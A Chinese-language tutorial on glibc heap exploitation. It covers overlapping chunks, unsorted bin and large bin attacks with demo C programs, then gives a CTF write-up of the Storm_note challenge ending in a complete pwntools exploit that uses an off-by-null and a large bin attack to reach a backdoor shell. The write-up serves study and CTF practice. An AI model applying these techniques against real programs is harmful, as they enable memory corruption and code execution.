   fprintf(stderr, "申请第一块属于 fastbin 的 chunk 在 %p\n", victim);
   intptr_t *victim_chunk = victim-2;//chunk 开始的位置
 
   fprintf(stderr, "在栈上伪造一块 fake chunk\n");
   fprintf(stderr, "设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n");
   stack_buffer_1[0] = 0;
   stack_buffer_1[1] = 0;
   stack_buffer_1[2] = victim_chunk;
 
   fprintf(stderr, "设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针");
   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
 
   void *p5 = malloc(1000);
   fprintf(stderr, "另外再分配一块，避免与 top chunk 合并 %p\n", p5);
 
   fprintf(stderr, "Free victim chunk %p, 他会被插入到 fastbin 中\n", victim);
   free((void*)victim);
 
   fprintf(stderr, "\n此时 victim chunk 的 fd、bk 为零\n");
   fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
 
   fprintf(stderr, "这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n", victim);
   void *p2 = malloc(1200);
 
   fprintf(stderr, "现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n");
   fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
   fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);
 
   fprintf(stderr, "现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n");
   victim[1] = (intptr_t)stack_buffer_1;
 
   fprintf(stderr, "然后申请跟第一个 chunk 大小一样的 chunk\n");
   fprintf(stderr, "他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n");
   void *p3 = malloc(100);
 
   fprintf(stderr, "最后 malloc 一次会返回 victim->bk 指向的那里\n");
   char *p4 = malloc(100);
   fprintf(stderr, "p4 = malloc(100)\n");
 
   fprintf(stderr, "\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n",stack_buffer_2[2]);
 
   fprintf(stderr, "\np4 在栈上 %p\n", p4);
   intptr_t sc = (intptr_t)jackpot;
   memcpy((p4+40), &sc, 8);
 }
 ```

​    运行结果。

 ![image-20211226161102216](/images/heap/image-20211226161102216.png)

​    在前面的技术中，我们已经知道怎样去伪造一个fake chunk，接下来，我们要尝试伪造一条small bins链。

​    首先创建两个chunk，第一个是我们的victim chunk，请确保它是一个small chunk，第二个随意，只是为了确保在free时victim chunk不会被合并进top chunk 里。然后，在栈上伪造两个fake chunk，让fake chunk 1的fd指向victim chunk，bk指向fake chunk 2，fake chunk 2的fd指向fake chunk 1，这样一个small bin链就差不多了。

​    如下图所示。

 ![image-20211226161117958](/images/heap/image-20211226161117958.png)

 ![image-20211226161122987](/images/heap/image-20211226161122987.png)

​    Glibc在malloc的时候会检查small bin链表中第二块chunk的bk指针是否指向第一块，来发现对small bins的破坏。为了绕过这个检查，所以才需要同时伪造bin中的前两个chunk。

​    接下来释放掉victim chunk，它首先会被放到fast bin中，这时候我们再去malloc一个large chunk，那么就会触发fast bin的合并，然后victim chunk就放到了unsorted bin中，最终被整理到small bin中。

​    接下来的第一个相应大小的malloc，会返回victim chunk的地址，再一次malloc将返回fake chunk 1的地址，地址在栈上且我们能够控制。

 ![image-20211226161127920](/images/heap/image-20211226161127920.png)

​    于是我们就成功地骗过了malloc在栈上分配了一个chunk。最后再想一下，其实最初的victim chunk使用fast chunk也是可以的，其释放后虽然是被加入到 fast bins中，而不是unsorted bin，但malloc之后，也会被整理到small bins里。自行尝试吧。

## overlapping_chunks

             ```c
             #include <stdio.h>
             #include <stdlib.h>
             #include <string.h>
             #include <stdint.h>
             
             int main(int argc , char* argv[]){
             
                 intptr_t *p1,*p2,*p3,*p4;
                 fprintf(stderr, "这是一个简单的堆块重叠问题，首先申请 3 个 chunk\n");
             
                 p1 = malloc(0x100 - 8);
                 p2 = malloc(0x100 - 8);
                 p3 = malloc(0x80 - 8);
                 fprintf(stderr, "这三个 chunk 分别申请到了:\np1：%p\np2：%p\np3：%p\n给他们分别填充\"1\"\"2\"\"3\"\n\n", p1, p2, p3);
             
                 memset(p1, '1', 0x100 - 8);
                 memset(p2, '2', 0x100 - 8);
                 memset(p3, '3', 0x80 - 8);
             
                 fprintf(stderr, "free 掉 p2\n");
                 free(p2);
                 fprintf(stderr, "p2 被放到 unsorted bin 中\n");
             
                 fprintf(stderr, "现在假设有一个堆溢出漏洞，可以覆盖 p2\n");
                 fprintf(stderr, "为了保证堆块稳定性，我们至少需要让 prev_inuse 为 1，确保 p1 不会被认为是空闲的堆块\n");
             
                 int evil_chunk_size = 0x181;
                 int evil_region_size = 0x180 - 8;
                 fprintf(stderr, "我们将 p2 的大小设置为 %d, 这样的话我们就能用 %d 大小的空间\n",evil_chunk_size, evil_region_size);
             
                 *(p2-1) = evil_chunk_size; // 覆盖 p2 的 size
             
                 fprintf(stderr, "\n现在让我们分配另一个块，其大小等于块p2注入大小的数据大小\n");
                 fprintf(stderr, "malloc 将会把前面 free 的 p2 分配给我们（p2 的 size 已经被改掉了）\n");
                 p4 = malloc(evil_region_size);
             
                 fprintf(stderr, "\np4 分配在 %p 到 %p 这一区域\n", (char *)p4, (char *)p4+evil_region_size);
                 fprintf(stderr, "p3 从 %p 到 %p\n", (char *)p3, (char *)p3+0x80-8);
                 fprintf(stderr, "p4 应该与 p3 重叠，在这种情况下 p4 包括所有 p3\n");
             
                 fprintf(stderr, "这时候通过编辑 p4 就可以修改 p3 的内容，修改 p3 也可以修改 p4 的内容\n\n");
             
                 fprintf(stderr, "接下来验证一下，现在 p3 与 p4:\n");
                 fprintf(stderr, "p4 = %s\n", (char *)p4+0x10);
                 fprintf(stderr, "p3 = %s\n", (char *)p3+0x10);
             
                 fprintf(stderr, "\n如果我们使用 memset(p4, '4', %d), 将会:\n", evil_region_size);
                 memset(p4, '4', evil_region_size);
                 fprintf(stderr, "p4 = %s\n", (char *)p4+0x10);
                 fprintf(stderr, "p3 = %s\n", (char *)p3+0x10);
             
                 fprintf(stderr, "\n那么之后再 memset(p3, '3', 80), 将会:\n");
                 memset(p3, '3', 80);
                 fprintf(stderr, "p4 = %s\n", (char *)p4+0x10);
                 fprintf(stderr, "p3 = %s\n", (char *)p3+0x10);
             }     
             ```

   这个比较简单，就是堆块重叠的问题。通过一个溢出漏洞，改写unsorted bin 中空闲堆块的size，改变下一次malloc可以返回的堆块大小。

​    直接动手调试，首先申请三个堆块。

 ![image-20211226161317690](/images/heap/image-20211226161317690.png)

​    接着free掉p2，这时候p2被放到unsorted bin中。 

 ![image-20211226161322101](/images/heap/image-20211226161322101.png)

​    然后把p2的size改成0x180，这时候就把p3给包含进去了。

 ![image-20211226161327419](/images/heap/image-20211226161327419.png)

​    然后再去申请一块大小为0x180的堆块p4，就能够编辑p4，就可以修改p3的内容，编辑p3也可以修改p4的内容。

 ![image-20211226161332208](/images/heap/image-20211226161332208.png)

## overlapping_chunks_2

   同样是堆块重叠的问题，前面那个是在chunk已经被free，加入到了unsorted bin之后，再修改其size值，然后malloc一个不一样的chunk出来，而这里是在 free之前修改size值，使free错误地修改了下一个chunk的prev_size值，导致中间的chunk强行合并。另外前面那个重叠是相邻堆块之间的，而这里是不相邻堆块之间的。

   源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <malloc.h>
 
 int main(){
   
   intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
   unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
   int prev_in_use = 0x1;
 
   fprintf(stderr, "\n一开始分配 5 个 chunk");
   p1 = malloc(1000);
   p2 = malloc(1000);
   p3 = malloc(1000);
   p4 = malloc(1000);
   p5 = malloc(1000);
 
   real_size_p1 = malloc_usable_size(p1);
   real_size_p2 = malloc_usable_size(p2);
   real_size_p3 = malloc_usable_size(p3);
   real_size_p4 = malloc_usable_size(p4);
   real_size_p5 = malloc_usable_size(p5);
 
   fprintf(stderr, "\nchunk p1 从 %p 到 %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
   fprintf(stderr, "\nchunk p2 从 %p 到 %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
   fprintf(stderr, "\nchunk p3 从 %p 到 %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
   fprintf(stderr, "\nchunk p4 从 %p 到 %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
   fprintf(stderr, "\nchunk p5 从 %p 到 %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));
 
   memset(p1,'A',real_size_p1);
   memset(p2,'B',real_size_p2);
   memset(p3,'C',real_size_p3);
   memset(p4,'D',real_size_p4);
   memset(p5,'E',real_size_p5);
   
   fprintf(stderr, "\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n");
   free(p4);
 
   fprintf(stderr, "\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n");
   *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;
   fprintf(stderr, "\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n");
   fprintf(stderr, "\n这样的话将会 free 掉的 p2 将会包含 p3\n");
   free(p2);
   
   fprintf(stderr, "\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n");
   p6 = malloc(2000);
   real_size_p6 = malloc_usable_size(p6);
 
   fprintf(stderr, "\nchunk p6 从 %p 到 %p", p6,  (unsigned char *)p6+real_size_p6);
   fprintf(stderr, "\nchunk p3 从 %p 到 %p\n", p3, (unsigned char *) p3+real_size_p3);
 
   fprintf(stderr, "\np3 中的内容: \n\n");
   fprintf(stderr, "%s\n",(char *)p3);
 
   fprintf(stderr, "\n往 p6 中写入\"F\"\n");
   memset(p6,'F',1500);
 
   fprintf(stderr, "\np3 中的内容: \n\n");
   fprintf(stderr, "%s\n",(char *)p3);
 }
 ```

​    我们需要五个堆块，假设第chunk 1存在溢出，可以改写第二个chunk 2的数据，chunk 5的作用是防止释放chunk 4后,被合并进top chunk。所以我们要重叠的区域是chunk 2到chunk 4。

   首先申请5个chunk，分别是p1，p2，p3，p4，p5。

 ![image-20211226161410128](/images/heap/image-20211226161410128.png)

   然后free掉p4，p4被放入unsorted bin。

 ![image-20211226161415878](/images/heap/image-20211226161415878.png)

接下来是最关键的一步，利用chunk 1的溢出漏洞，将chunk 2的size值修改为chunk 2和chunk 3的大小之和，即0x3f0+0x3f0+0x1=0x7e1，最后的1是标志位。

 ![image-20211226161421815](/images/heap/image-20211226161421815.png)

这样当我们释放chunk 2的时候，malloc根据这个被修改的size值，会以为chunk 2加上 chunk 3的区域都是要释放的，然后就错误地修改了chunk 5的 prev_size。接着，它发现紧邻的一块chunk 4也是 free 状态，就把它俩合并在了一起，组成一个大free chunk，放进unsorted bin中。

 ![image-20211226161426600](/images/heap/image-20211226161426600.png)

   再次去malloc 0x7e0大小的chunk p6会把包含p3的p2给申请到，这样再去编辑p6的时候也可以编辑到p3。

 ![image-20211226161431796](/images/heap/image-20211226161431796.png)

## unsorted_bin_attack

​    unsorted bin攻击通常是为更进一步的攻击做准备的，我们知道unsorted bin是一个双向链表，在分配时会通过unlink操作将chunk从链表中移除，所以如果能够控制unsorted bin chunk的bk指针，就可以向任意位置写入一个指针。

  源码如下。

 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main(){
 
     fprintf(stderr, "unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n");
     fprintf(stderr, "实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\n\n");
 
     unsigned long stack_var=0;
     fprintf(stderr, "我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\n\n", &stack_var, stack_var);
 
     unsigned long *p=malloc(0x410);
     fprintf(stderr, "一开始先申请一个比较正常的 chunk: %p\n",p);
     fprintf(stderr, "再分配一个避免与 top chunk 合并\n\n");
     malloc(500);
 
     free(p);
     fprintf(stderr, "当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\n",(void*)p[1]);
 
     p[1]=(unsigned long)(&stack_var-2);
     fprintf(stderr, "现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\n");
     fprintf(stderr, "我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\n\n",(void*)p[1]);
 
     malloc(0x410);
     fprintf(stderr, "再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\n");
     fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);
 }
 ```

​    编译完成之后分别在10、13、16、19行下断点。

​    然后运行，一开始先申请两个chunk，第二个是为了防止和top chunk合并。

 ![image-20211226161510074](/images/heap/image-20211226161510074.png)

​    当free之后，这个chunk的fd、bk都指向了unsorted bin的位置，因为unsorted bin是双向链表。

 ![image-20211226161514175](/images/heap/image-20211226161514175.png)

   继续，通过p[1] = (unsigned long)(&stack_var - 2)，把bk指针给改掉了。unsigned long是8字节大小的，所以减去2之后正好是在address 这个地方。

 ![image-20211226161521192](/images/heap/image-20211226161521192.png)

​    然后再去申请的时候需要把释放的那一块给拿出来，操作如下：

 ```c
 /* remove from unsorted list */
 //bck = chunk->bk
 unsorted_chunks (av)->bk = bck;
 bck->fd = unsorted_chunks (av);
 ```

  把unsorted bin的bk改为chunk的bk，然后将chunk的bk所指向的 fd改为unsorted bin的地址。

 ![image-20211226161538460](/images/heap/image-20211226161538460.png)	

 ![image-20211226161546845](/images/heap/image-20211226161546845.png)

   因为对于一个chunk来说，chunk头是占据0x10大小的（也就是图中 address），所以fd正好是我们想要改的那个地址。

 ![image-20211226161553201](/images/heap/image-20211226161553201.png)

 ![image-20211226161559404](/images/heap/image-20211226161559404.png)

## large_bin_attack

​    回顾一下large bin的概念，large bin大小：大于1024字节

   双向循环链表，先进先出，按照从大到小排序

   当有空闲块相邻的时候，chunk会被合并

   除了fd、bk指针还有fd_nextsize和bk_nextsize

​    源码如下。

 ```c
 #include<stdio.h>
 #include<stdlib.h>
  
 int main()
 {
     fprintf(stderr, "根据原文描述跟 unsorted bin attack 实现的功能差不多，都是把一个地址的值改为一个很大的数\n\n");
 
     unsigned long stack_var1 = 0;
     unsigned long stack_var2 = 0;
 
     fprintf(stderr, "先来看一下目标:\n");
     fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
     fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
 
     unsigned long *p1 = malloc(0x320);
     fprintf(stderr, "分配第一个 large chunk: %p\n", p1 - 2);
 
     fprintf(stderr, "再分配一个 fastbin 大小的 chunk，来避免 free 的时候下一个 large chunk 与第一个合并了\n\n");
     malloc(0x20);
 
     unsigned long *p2 = malloc(0x400);
     fprintf(stderr, "申请第二个 large chunk 在: %p\n", p2 - 2);
 
     fprintf(stderr, "同样在分配一个 fastbin 大小的 chunk 防止合并掉\n\n");
     malloc(0x20);
 
     unsigned long *p3 = malloc(0x400);
     fprintf(stderr, "最后申请第三个 large chunk 在: %p\n", p3 - 2);
  
     fprintf(stderr, "申请一个 fastbin 大小的防止 free 的时候第三个 large chunk 与 top chunk 合并\n\n");
     malloc(0x20);
  
     free(p1);
     free(p2);
     fprintf(stderr, "free 掉第一个和第二个 chunk，他们会被放在 unsorted bin 中 [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));
 
     malloc(0x90);
     fprintf(stderr, "现在去申请一个比他俩小的，然后会把第一个分割出来，第二个则被整理到 largebin 中，第一个剩下的会放回到 unsortedbin 中 [ %p ]\n\n", (void *)((char *)p1 + 0x90));
 
     free(p3);
     fprintf(stderr, "free 掉第三个，他会被放到 unsorted bin 中: [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));
 
     fprintf(stderr, "假设有个漏洞，可以覆盖掉第二个 chunk 的 \"size\" 以及 \"bk\"、\"bk_nextsize\" 指针\n");
     fprintf(stderr, "减少释放的第二个 chunk 的大小强制 malloc 把将要释放的第三个 large chunk 插入到 largebin 列表的头部（largebin 会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x10，bk_nextsize 为 stack_var2-0x20\n\n");
 
     p2[-1] = 0x3f1;
     p2[0] = 0;
     p2[2] = 0;
     p2[1] = (unsigned long)(&stack_var1 - 2);
     p2[3] = (unsigned long)(&stack_var2 - 4);
 
     malloc(0x90);
     fprintf(stderr, "再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了:\n");
     fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
     fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
     return 0;
 }
 ```

​    该技术可用于修改任意地址的值，例如栈上的变量stack_var1和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在fastbin attack 中用于修改全局变量global_max_fast为一个很大的值。

​    首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。

 ![image-20211226161649066](/images/heap/image-20211226161649066.png)

​    接下来释放p1和p2，它们被放入unsorted bin中。

  ![image-20211226161654862](/images/heap/image-20211226161654862.png)

​    接下来去申请一个0x90大小的堆块，他会把前面那个0x320大小的堆块切割，同时会给unsorted bin中的free chunk进行整理划分，把那第二块大的放到large bin，第一个剩余的放回到unsorted bin中。

 ![image-20211226161700142](/images/heap/image-20211226161700142.png)

​    接着free掉p3，将其放入unsorted bin，我们伪造的分别是p2的size、bk以及bk_nextsize，紧接着进行malloc操作，将p3整合进large bin。

  ![image-20211226161705314](/images/heap/image-20211226161705314.png)

​    Large bin是按照fd指针的顺序从大到小排列的，所以需要进行排序，排序的操作大概是：

 ```c
 //victim是p3、fwd是修改后的p2
 {
     victim->fd_nextsize = fwd;//1
     victim->bk_nextsize = fwd->bk_nextsize;//2
     fwd->bk_nextsize = victim;//3
     victim->bk_nextsize->fd_nextsize = victim;//4
 }
 victim->bk = bck;
 victim->fd = fwd;
 fwd->bk = victim;
 bck->fd = victim;
 ```

​    把2带入4得到：fwd->bk_nextsize->fd_nextsize=victim，同时下面有：fwd->bk=victim。也就是说之前我们伪造的p2的bk跟bk_nextsize指向的地址被改为了victim，即(unsigned long)(&stack_var1 - 2)与(unsigned long)(&stack_var2 - 4)被改为了victim。

 ![image-20211226161716402](/images/heap/image-20211226161716402.png)

## 西湖论剑[Storm_note](https://bbs.pediy.com/thread-254849.htm)

赛题下载后，checksec查看程序的保护机制 

![image-20211226161859447](/images/heap/image-20211226161859447.png)

###  程序分析   

#### init_proc函数

​    程序一开始就对进程进行初始化，`mallopt(1, 0)`禁用了fastbin，然后通过mmap在0xABCD0000分配了一个页面的可读可写空间，最后往里面写入一个随机数。 

![image-20211226161959441](/images/heap/image-20211226161959441.png)

#### alloc_note函数

​    首先遍历全局变量note，找到一个没有存放内容的地方保存堆指针。然后限定了申请的堆的大小最多为0xFFFFF，调用calloc函数来分配堆空间，因此返回

前会对分配的堆的内容进行清零。

 ![image-20211226162007268](/images/heap/image-20211226162007268.png)

#### edit_note函数

​     存在一个off_by_null漏洞，在read后v2保存写入的字节数，最后在该偏移处的字节置为0，形成off_by_null。

 ![image-20211226162020179](/images/heap/image-20211226162020179.png)	

#### delete_note函数

​    这个函数就是正常free堆指针，并置0。

 ![image-20211226162039560](/images/heap/image-20211226162039560.png)

#### backdoor函数

​    程序提供一个可以直接getshell的后门，触发的条件就是输入的数据与mmap映射的空间的前48个字节相同。

 ![image-20211226162057414](/images/heap/image-20211226162057414.png)

### 利用思路

1. 利用off_by_null漏洞实现chunk overlapping，从而控制堆块内容。

2. 将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack

3. 伪造largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写。

4. 触发后门

###  调试过程

#### 1.Chunk overlapping

​    首先分配7个chunk，chunk1和chunk4是用于放入largebin的大chunk，chunk6防止top chunk合并。Chunk结构如下。

 ```python
 add(0x18)  #0
 add(0x508) #1
 add(0x18)  #2
 
 add(0x18)  #3
 add(0x508) #4
 add(0x18)  #5
 add(0x18)  #6
 ```

![image-20211226162219738](/images/heap/image-20211226162219738.png)

​    构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。如下图所示。

 ```python
 edit(1,'a'*0x4f0+p64(0x500)) #prev_size
 edit(4,'a'*0x4f0+p64(0x500)) #prev_size
 ```

![image-20211226162256759](/images/heap/image-20211226162256759.png)

​    接着利用off by null漏洞改写chunk 1的size为0x500。

```python
free(1)
edit(0,'a'*0x18) #off by null
```

![image-20211226162339888](/images/heap/image-20211226162339888.png)

​    然后就可以进行chunk overlap了, 先将0x20的chunk释放掉，然后释放chunk2，这时触发unlink。

 ```python
 add(0x18)  #1
 add(0x4d8) #7 
 
 free(1)
 free(2)    #overlap
 ```

 ![image-20211226162411250](/images/heap/image-20211226162411250.png)

​    接下来用同样的方法对第二个大小为0x510的chunk进行overlapping。

 ```python
 free(4)
 edit(3,'a'*0x18) #off by null
 add(0x18)        #4
 add(0x4d8)       #8 
 free(4)
 free(5)          #overlap
 add(0x40)        #4 
 edit(8, 'aaaa')
 ```



#### 2.放入large bin

​    那么如何将unsorted bin中的chunk放入large bin呢？下面是glibc判断

 ```c
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))//从第一个unsortedbin的bk开始遍历
 {
     bck = victim->bk;
     size = chunksize (victim);
     if (in_smallbin_range (nb) &&//<_int_malloc+627>
         bck == unsorted_chunks (av) &&
         victim == av->last_remainder &&
         (unsigned long) (size) > (unsigned long) (nb + MINSIZE))    //unsorted_bin的最后一个，并且该bin中的最后一个chunk的size大于我们申请的大小
     {remainder_size = size - nb;
      remainder = chunk_at_offset (victim, nb);...}//将选中的chunk剥离出来，恢复unsortedbin
     if (__glibc_unlikely (bck->fd != victim))
             malloc_printerr ("malloc(): corrupted unsorted chunks 3");
      unsorted_chunks (av)->bk = bck;    //largebin attack
     //注意这个地方，将unsortedbin的bk设置为victim->bk，如果我设置好了这个bk并且能绕过上面的检查,下次分配就能将target chunk分配出来
     if (size == nb)//size相同的情况同样正常分配
     if (in_smallbin_range (size))//放入smallbin
      {
         victim_index = smallbin_index (size);
         bck = bin_at (av, victim_index);
         fwd = bck->fd;
      }
      else//放入large bin
      {
          while ((unsigned long) size < chunksize_nomask (fwd))
          {
             fwd = fwd->fd_nextsize;//fd_nextsize指向比当前chunk小的下一个chunk
             assert (chunk_main_arena (fwd));
           }
           if ((unsigned long) size
                           == (unsigned long) chunksize_nomask (fwd))
                         /* Always insert in the second position.  */
              fwd = fwd->fd;
           else// 插入
           {
             //解链操作，nextsize只有largebin才有
             victim->fd_nextsize = fwd;
             victim->bk_nextsize = fwd->bk_nextsize;
             fwd->bk_nextsize = victim;
             victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim
            }
           bck = fwd->bk;
       }
    }
  else
      victim->fd_nextsize = victim->bk_nextsize = victim;
 }
  mark_bin (av, victim_index);
 //解链操作2,fd,bk
  victim->bk = bck;
  victim->fd = fwd;
  fwd->bk = victim;
  bck->fd = victim;
 //fwd->bk->fd=victim
 ```

​    大概意思就是说我们申请堆块时，glibc会从unsorted bin末尾开始遍历，倘若遍历到不符合我们的要求大小，那么系统会做sorted——重新把这个free chunk放入small bin或large bin中。

 ```python
 free(2)     #unsortedbin-> chunk2 -> chunk5(0x4e0)which size is largebin FIFO
 add(0x4e8)  #put chunk5(0x4e0) to largebin
 free(2)     #put chunk2 to unsortedbin
 ```

​    这个过程就是，在unsorted bin中存放着两个大chunk，第一个0x4e0，第二个0x4f0。当我申请一个0x4e8的chunk时，首先找到0x4e0的chunk，太小了不符合调件，于是将它拿出unsorted bin，放入large bin。在放入large bin时就会进行两步解链操作，两个解链操作的最后一步是关键。

 ![image-20211226162620445](/images/heap/image-20211226162620445.png)

​    可以看到从unsorted bin->bk开始遍历，第一个的size < nb因此就会放入large bin，继续往前遍历，找到0x4f0的chunk，刚好满足size==nb，因此将其分配出来。最后在free(2)将刚刚分配的chunk2再放回unsorted bin，进行第二次利用。

 ![image-20211226162626453](/images/heap/image-20211226162626453.png)

#### 3.large bin attack

​    接下来伪造unsorted bin的bk

 ```python
 content_addr = 0xabcd0100
 fake_chunk = content_addr - 0x20
 
 payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
 payload += p64(0) + p64(fake_chunk)      # bk
 edit(7, payload)
 ```

​    效果图如下。

 ![image-20211226162705942](/images/heap/image-20211226162705942.png)

​    再伪造large bin的bk和bk_nextsize。

 ```python
 payload2 = p64(0)*4 + p64(0) + p64(0x4e1)  #size
 payload2 += p64(0) + p64(fake_chunk+8)   
 payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap
 edit(8, payload2)
 ```

![image-20211226162726927](/images/heap/image-20211226162726927.png)

​    那么为什么修改这些值呢，再回顾一下两个解链操作。

 ```c
 else// 插入
           {
             //解链操作，nextsize只有largebin才有
             victim->fd_nextsize = fwd;
             victim->bk_nextsize = fwd->bk_nextsize;
             fwd->bk_nextsize = victim;
             victim->bk_nextsize->fd_nextsize = victim;//fwd->bk_nextsize->fd_nextsize=victim
            }
           bck = fwd->bk;
       }
    }
  else
      victim->fd_nextsize = victim->bk_nextsize = victim;
 }
  mark_bin (av, victim_index);
 //解链操作2,fd,bk
  victim->bk = bck;
  victim->fd = fwd;
  fwd->bk = victim;
  bck->fd = victim;
 //fwd->bk->fd=victim
 ```

   这里情况很复杂，需要耐心把每一步链表的操作搞明白，才能理解它的原理。首先victim指的是处在unsorted bin中的堆块，fwd是large bin中的堆块。

  再来回顾一下我们的构造：

 ```c
 victim->bk = fake_chunk
 fwd->bk = fake_chunk+8
 fwd->bk_nextsize=fake_chunk-0x18-5
 ```

  通过解链操作1，我们能得到：

 ```c
 victim->fd_nextsize=fwd
 victim->bk_nextsize=fake_chunk-0x18-5
 fwd->bk_nextsize=victim
 victim->bk_nextsize->fd_nextsize=fake_chunk-0x18-5+0x20=fake_chunk+3=victim
 ```

  通过解链操作2，我们能得到：

 ```c
 victim->bk = bck = fwd->bk = fake_chunk+ 8
 victim->fd = largbin_entry
 fwd->bk = victim
 bck->fd = (fake_chunk +8)->fd = victim
 ```

  接下来我们可以观察一下调试的结果是否与我们分析的一致。

 ![image-20211226162922399](/images/heap/image-20211226162922399.png)

 ![image-20211226162928596](/images/heap/image-20211226162928596.png)

  因为fake_chunk-5处会写入victim的地址，开启地址随机化的开头地址是0x55或0x56，所以fake_chunk的size位是0x55或0x56。

  当_int_malloc返回之后会进行如下检查。

 ![image-20211226162936052](/images/heap/image-20211226162936052.png)

  其中宏定义如下。

 ![image-20211226162941269](/images/heap/image-20211226162941269.png)

  0x55&0x2=0，绕不过检查，所以只有size为0x56时，我们才能申请到0xabcd0100-0x20处的堆块。

#### 4.后门利用

```python
add(0x48)
payload = p64(0) * 2 + p64(0) * 6
edit(2, payload)

p.sendlineafter('Choice: ','666')
p.send(p64(0)*6)
```

  申请到目标堆块后，将0Xabcd0100处的随机数改为0，触发后门。

 ![image-20211226163021383](/images/heap/image-20211226163021383.png)

 ![image-20211226163026373](/images/heap/image-20211226163026373.png)

### 完整exp

 ```python
 from pwn import *
 
 context.log_level = 'debug'
 binary = './Storm_note'
 elf = ELF(binary)
 libc = elf.libc
 local = 1
 if local:
  p = process(binary)
 else:
  p = remote('')
 
 def add(size):
  p.sendlineafter('Choice: ', '1')
  p.sendlineafter('?\n', str(size))
 
 def edit(index, content):
  p.sendlineafter('Choice: ', '2')
  p.sendlineafter('?\n', str(index))
  p.sendafter('\n', content)
 
 def free(index):
  p.sendlineafter('Choice: ', '3')
  p.sendlineafter('?\n', str(index))
 
 gdb.attach(p)
 add(0x18)  #0
 add(0x508) #1
 add(0x18)  #2
 
 add(0x18)  #3
 add(0x508) #4
 add(0x18)  #5
 add(0x18)  #6
 
 edit(1,'a'*0x4f0+p64(0x500)) #prev_size
 edit(4,'a'*0x4f0+p64(0x500)) #prev_size
 
 free(1)
 edit(0,'a'*0x18) #off by null
 
 add(0x18)  #1
 add(0x4d8) #7 
 
 free(1)
 free(2)    #overlap
 
 
 #recover
 add(0x30)  #1
 add(0x4e0) #2
 
 free(4)
 edit(3,'a'*0x18) #off by null
 add(0x18)        #4
 add(0x4d8)       #8 
 free(4)
 free(5)          #overlap
 add(0x40)        #4 
 edit(8, 'aaaa')
 # pause()
 
 free(2)     #unsortedbin-> chunk2 -> chunk5(0x4e0)    which size is largebin FIFO
 add(0x4e8)  #put chunk5(0x4e0) to largebin
 free(2)     #put chunk2 to unsortedbin
 
 content_addr = 0xabcd0100
 fake_chunk = content_addr - 0x20
 
 payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
 payload += p64(0) + p64(fake_chunk)      # bk
 edit(7, payload)
 
 payload2 = p64(0)*4 + p64(0) + p64(0x4e1)  #size
 payload2 += p64(0) + p64(fake_chunk+8)   
 payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmap
 edit(8, payload2)
 # pause()
 
 add(0x48)
 payload = p64(0) * 2 + p64(0) * 6
 edit(2, payload)
 
 p.sendlineafter('Choice: ','666')
 p.send(p64(0)*6)
 
 p.interactive()
